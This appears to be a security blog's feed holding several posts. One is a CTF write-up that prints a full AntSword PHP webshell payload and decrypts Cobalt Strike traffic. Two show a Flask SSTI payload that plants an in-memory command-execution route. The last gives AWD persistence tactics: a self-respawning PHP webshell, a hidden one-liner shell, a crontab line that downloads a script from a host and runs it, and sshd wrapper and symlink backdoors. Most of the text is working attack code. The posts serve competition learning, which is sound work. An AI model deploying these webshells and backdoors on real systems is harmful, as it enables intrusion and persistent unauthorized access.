class="line">$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">$ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir);</span><br><span class="line">@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">foreach($oparr as $item) &#123;</span><br><span class="line">if(!@is_writable($item)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;;</span><br><span class="line">@mkdir($tmdir);</span><br><span class="line">if(!@file_exists($tmdir)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">@chdir($tmdir);</span><br><span class="line">@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">$cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;,$tmdir);</span><br><span class="line">for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class="line">@chdir(&quot;..&quot;);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;);</span><br><span class="line">@rmdir($tmdir);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;36&quot;.&quot;4f2&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;42&quot;.&quot;ff1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2));</span><br><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br><span class="line">$envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2));</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($envstr)) &#123;</span><br><span class="line">$envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class="line">foreach($envarr as $v) &#123;</span><br><span class="line">if (!empty($v)) &#123;</span><br><span class="line">@putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">function fe($f) &#123;</span><br><span class="line">$d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">if(empty($d)) &#123;</span><br><span class="line">$d&#x3D;array();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));</span><br><span class="line">&#125;</span><br><span class="line">return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runshellshock($d, $c) &#123;</span><br><span class="line">if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123;</span><br><span class="line">if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123;</span><br><span class="line">$tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;);</span><br><span class="line">putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">if (fe(&#39;error_log&#39;)) &#123;</span><br><span class="line">error_log(&quot;a&quot;, 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">$output &#x3D; @file_get_contents($tmp);</span><br><span class="line">@unlink($tmp);</span><br><span class="line">if ($output !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">print($output);</span><br><span class="line">return True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runcmd($c) &#123;</span><br><span class="line">$ret&#x3D;0;</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if(fe(&#39;system&#39;)) &#123;</span><br><span class="line">@system($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;passthru&#39;)) &#123;</span><br><span class="line">@passthru($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;shell_exec&#39;)) &#123;</span><br><span class="line">print(@shell_exec($c));</span><br><span class="line">&#125; elseif(fe(&#39;exec&#39;)) &#123;</span><br><span class="line">@exec($c,$o,$ret);</span><br><span class="line">print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">&#125; elseif(fe(&#39;popen&#39;)) &#123;</span><br><span class="line">$fp&#x3D;@popen($c,&#39;r&#39;);</span><br><span class="line">while(!@feof($fp)) &#123;</span><br><span class="line">print(@fgets($fp,2048));</span><br><span class="line">&#125;</span><br><span class="line">@pclose($fp);</span><br><span class="line">&#125; elseif(fe(&#39;proc_open&#39;)) &#123;</span><br><span class="line">$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io);</span><br><span class="line">while(!@feof($io[1])) &#123;</span><br><span class="line">print(@fgets($io[1],2048));</span><br><span class="line">&#125;</span><br><span class="line">while(!@feof($io[2])) &#123;</span><br><span class="line">print(@fgets($io[2],2048));</span><br><span class="line">&#125;</span><br><span class="line">@fclose($io[1]);</span><br><span class="line">@fclose($io[2]);</span><br><span class="line">@proc_close($p);</span><br><span class="line">&#125; elseif(fe(&#39;antsystem&#39;)) &#123;</span><br><span class="line">@antsystem($c);</span><br><span class="line">&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">return $ret;</span><br><span class="line">&#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">$w&#x3D;new COM(&#39;WScript.shell&#39;);</span><br><span class="line">$e&#x3D;$w-&gt;exec($c);</span><br><span class="line">$so&#x3D;$e-&gt;StdOut();</span><br><span class="line">$ret.&#x3D;$so-&gt;ReadAll();</span><br><span class="line">$se&#x3D;$e-&gt;StdErr();</span><br><span class="line">$ret.&#x3D;$se-&gt;ReadAll();</span><br><span class="line">print($ret);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$ret &#x3D; 127;</span><br><span class="line">&#125;</span><br><span class="line">return $ret;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>可以看到，参数s接收执行命令的参数    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br></pre></td></tr></table></figure><p>所以s=</p><figure class="highlight plain"><figcaption><span>/d "D:\\phpstudy_pro\\WWW\\secret"&"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>可以得到压缩密码为P4Uk6qkh6Gvqwg3y。下面就可以解压beacon keys.下面需要做的工作为：获得私钥，通过私钥获得AES密钥以查看与teamserver的通信内容。需要用到的工具在<br><a href="https://github.com/WBGlIl/CS_Decrypt">https://github.com/WBGlIl/CS_Decrypt</a></p><p>首先是根据私钥文件恢复RSA KEY。<img src="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim" alt="paste image">根据RSA KEY 恢复AES KEY，需要看beacon通信的数据包，根据cs特性，一般这个值藏在cookie里。<img src="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim" alt="paste image"><img src="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim" alt="paste image">拿到AES KEY之后，继续利用脚本还原beacon返回的内容，这里抓取的是submit.php的特征。根据CobaltStrike的通信规则，beacon会向teamserver POST submit.php?id=xxx，POSTDATA为AES加密后的内容。将加密后的内容复制出来之后解密<img src="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim" alt="paste image"><br>注意需要是base64格式的，然后使用脚本进行解密<img src="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim" alt="paste image">解密后得到flag。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这题太折磨人了，做了好久才做出来，写wp又写了一段时间。顺便学了下CS的简单通信过程，收获还是有的。<br>参考链接：<a href="https://blog.csdn.net/qq_43264813/article/details/120560209">https://blog.csdn.net/qq_43264813/article/details/120560209</a><br><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan</a><br><a href="https://www.wkr.moe/ctf/610.html#toc-head-3">https://www.wkr.moe/ctf/610.html#toc-head-3</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Analysis of flask memory webshell</title>
      <link href="2021/09/24/Analysis-of-flask-memory-webshell/"/>
      <url>2021/09/24/Analysis-of-flask-memory-webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="NOTICE"><a href="#NOTICE" class="headerlink" title="NOTICE"></a>NOTICE</h1><p>Before analysis , I assumed that you know the princple of SSTI and now how to find the exploit chain.You should know  url_for.__globals__ could find global variables in current app.</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In the previous passage I’ve introduced memory webshell in flask and implemented it,so in this passage I’ll analyse the procedure of a web request which request flask and make sense how to generate a memory shell.</p><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>This is a EXP in Flask SSTI vulnerability which could register a route and execute system command.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](</span><br><span class="line">&quot;app.add_url_rule(</span><br><span class="line">&#39;&#x2F;shell&#39;, </span><br><span class="line">&#39;shell&#39;, </span><br><span class="line">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">)</span><br><span class="line">&quot;,</span><br><span class="line">&#123;</span><br><span class="line">&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],</span><br><span class="line">&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>There are some complex functions and variables in the PoC,I’ll explain it.<br>From SSTI we can reach eval function to execute python command,such as eval(“__import__(‘os’).popen(‘whoami’).read()”)<img src="http://cdn.polowong.top/163249208767051gyctei.png?imageslim" alt="paste image"><br>function add_url_rule() is used for adding route,such as add route in flask app.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule(rule, endpoint&#x3D;None, view_func&#x3D;None, provide_automatic_options&#x3D;None, **options)</span><br></pre></td></tr></table></figure><p>Briefly,we can pass parameter to this function to register route and define the handle function.<br>Usually we can pass(‘/shell’,’shell’,lambda:xxxx_lambda_function_code) to this function to register a route /shell and define the handle founction.<br>In this demo,the lambda function could receive parameter from front-end and execute system command.It looks like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">&#39;&#x2F;shell&#39;, </span><br><span class="line">&#39;shell&#39;, </span><br><span class="line">lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p> This lambda function could receive and handle the parameter passed from front-end and execute it.Until now I  didn’t explain variables like request_ctx_stack 、app、current_app.</p><p> request_ctx_stack like a stack structure, every web request will be pushed into this stack and pop 、handle it.<br>So, in this EXP it(request_ctx_stack.top) represents the current request object,just like in your flask app’s every handle function in route to handle the current request!</p><p>request.args.get() is used for get the parameter’s value from front-end,juset need the parameter name and the default value is whoami in this EXP.</p><p>In eval function, we noticed that there is a variable called app, but now we don’t now what is app.But we know that we can pass parameters and values by eval via dict format in python, so we can pass paramater what we used like app,request_ctx_stack.</p><p>We  have analysed  all the EXP, so we can generate a memory webshell now:)<br><img src="http://cdn.polowong.top/1632494776728fam272p6.png?imageslim" alt="paste image">no new route was found in source code:)<img src="http://cdn.polowong.top/1632495118141e8t9fc9j.png?imageslim" alt="paste image"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p> <a href="https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a><br> <a href="https://segmentfault.com/blog/myflask">https://segmentfault.com/blog/myflask</a><br> <a href="https://www.cnblogs.com/bigox/p/11652859.html">https://www.cnblogs.com/bigox/p/11652859.html</a><br> <a href="https://englndcib.blogspot.com/2021/08/python-lambda.html">https://englndcib.blogspot.com/2021/08/python-lambda.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>implementation of memory webshell in flask</title>
      <link href="2021/09/05/webshell-in-flask/"/>
      <url>2021/09/05/webshell-in-flask/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Server-side Template Injection(SSTI)  is a common vulnerability in Flask framework.If the application choosed flask framework and exists SSTI vulnerability,actually easy to be exploited .</p><p>It is easy to be exploited if a SSTI vulnerability were found. In this page ,I’ll show how to utilize it to inject webshell into memory.In next passage I’ll explain the procedure of a Flask app receive,understand and execute the command which sent by user.</p><h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><p>A simple Flask framework web application with SSTI vulnerability as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>In this demo , you can enter test directory and pass parameter ‘name’ via GET method,which could execute python command by a specific attack payload which generated by SSTI exploit chains.</p><p>Simple SSTI PoC in this demo(webserver launched on my desktop, default ip is 127.0.0.1, port:5000):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;test?url&#x3D;&#123;&#123;url_for.__globals__.__builtins__[%27eval%27](%22__import__(%27os%27).popen(%27whoami%27).read()%22)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/1631714973234z6zu44pt.png?imageslim" alt="paste image"><br>This PoC shows that  SSTI vulnerability could execute system command in web page  which based on Flask.But the privilege inherited from the user who launched this application.</p><h1 id="Webshell-injection-in-Flask"><a href="#Webshell-injection-in-Flask" class="headerlink" title="Webshell injection in Flask"></a>Webshell injection in Flask</h1><p>There is a way to inject webshell into flask:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.find the function which responsible for registering route</span><br><span class="line">2.pass paramaters to the function and improt os modules to execute system command</span><br><span class="line">3.expose an API to  execute user-defined system commandso </span><br><span class="line">so here is the Payload</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;app.add_url_rule(&#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/1631718243223q0ni26nb.png?imageslim" alt="paste image"><br>Above figure shows that a webshell was generated in memory and can be visited via route /shell while pass paramater cmd to execute the system command,default command are whoami.</p><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>In this passage I just show how to use it , but I think the critical problem is analyse the execute logic and try to find some way to fix? or exploit it in a new way:)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AWD新手的不死马及权限维持思路</title>
      <link href="2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/"/>
      <url>2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接<br><a href="https://jlkl.github.io/2019/02/08/Web_13/">https://jlkl.github.io/2019/02/08/Web_13/</a><br><a href="https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/">https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/</a><br><a href="https://www.cnblogs.com/Cl0ud/p/13620537.html">https://www.cnblogs.com/Cl0ud/p/13620537.html</a><br><a href="https://zhuanlan.zhihu.com/p/88850561">https://zhuanlan.zhihu.com/p/88850561</a></p></blockquote><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>不死马指的是入到内存的webshell，在PHP中可以使用ulink删除自身文件并循环创建webshell。</p><h1 id="不死马利用流程"><a href="#不死马利用流程" class="headerlink" title="不死马利用流程"></a>不死马利用流程</h1><p>首先根据web后门或者任何挖掘出来的漏洞尝试执行系统命令（如遗留的web后门等），通过该类漏洞成功执行写入不死马的系统命令并执行该不死马。比如通过内置的后门直接system(“echo 不死马脚本内容 &gt;/var/www/html;php 不死马文件名.php”)。这样就会在该目录下不断生成一个不死马 比如.3.php。通过webshell管理工具或者使用Python写脚本批量访问去getflag。</p><h1 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h1><p>这里偷个别的师傅的图先<br><img src="http://cdn.polowong.top/1622256277454oiqbb65p.png?imageslim" alt="paste image">不死马一般长这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ignore_user_abort(true);&#x2F;&#x2F;设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    unlink(__FILE__);</span><br><span class="line">    $file &#x3D; &#39;.3.php&#39;;</span><br><span class="line">    $code &#x3D; &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])&#x3D;&#x3D;&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#39;;</span><br><span class="line">    &#x2F;&#x2F;pass&#x3D;pass</span><br><span class="line">    while (1)&#123;</span><br><span class="line">        file_put_contents($file,$code);</span><br><span class="line">        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#39;);</span><br><span class="line">        usleep(0);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>该不死马不断生成.3.php，通过访问<a href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a>  然后POST a=system(“想要执行的系统命令”);即可通过不死马实现命令执行。这里使用MD5是因为防止别人骑着自己的马进去了，MD5理论上不可逆。如果使用python批量getshell的话大体思路就是</p><p>url=<a href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a><br>data={“a”:”system(&quot;cat /flag&quot;);”}<br>flag=requests.post(url=url,data=data).text然后url变变就可以，一般会维护一个地址池 从地址池里面取url或者取特征（可能某个url字段不一样）直接打就行，再配合提交flag的api就可以实现自动getflag。</p><h1 id="不死马删除"><a href="#不死马删除" class="headerlink" title="不死马删除"></a>不死马删除</h1><p>这里不死马删除有几个思路<br>1.shell脚本直接删除不死马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while :</span><br><span class="line">do</span><br><span class="line">rm -rf .3.php;</span><br><span class="line">echo &quot;remove success&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>这里其实可以更完善一些，比如挂上while自动检测新增的文件 或者配合文件监控脚本实现新增之后直接调用函数删除新增的文件等等（Python实现，我不会shell）<br>2.PHP服务重启（awd环境可能不允许，因为权限较低）<br>service apache2 restart<br>service php restart</p><p>3.杀低权限PHP进程<br>php-apache:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep httpd | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br></pre></td></tr></table></figure><p>php-fpm:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep php-fpm | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="awd权限维持"><a href="#awd权限维持" class="headerlink" title="awd权限维持"></a>awd权限维持</h1><p>AWD的权限维持其实和普通的权限维持差不多常用的大概有 crontab ssh软连接 sshwrapper。<br>详情参考<a href="https://xz.aliyun.com/t/7338%E7%BB%86%E7%9C%8B%E4%BA%86%E4%B8%8B%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0">https://xz.aliyun.com/t/7338细看了下这篇文章</a> 发现了一个隐藏一句话的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;&lt;?&#x3D;\&#96;\$_POST[cmd]\&#96;?&gt;\r&lt;?&#x3D;&#39;System default page.&#39;;?&gt;&quot; &gt;default.php</span><br></pre></td></tr></table></figure><p>crontab添加计划任务自动写不死马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * curl http:&#x2F;&#x2F;host&#x2F;sh.sh &gt;&#x2F;tmp&#x2F;.tmp&#x2F;1.sh;chmod u+x &#x2F;tmp&#x2F;.tmp&#x2F;1.sh ; &#x2F;tmp&#x2F;.tmp&#x2F;1.sh</span><br></pre></td></tr></table></figure><p>本地起一个http服务 放上一个sh.sh脚本，里面写了创建php不死马的命令。<br>下面两种暂时利用失败 可能是腾讯云的原因。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh wrapper</span><br><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line">exp:</span><br><span class="line">socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377</span><br><span class="line">ssh软连接</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;5555;</span><br><span 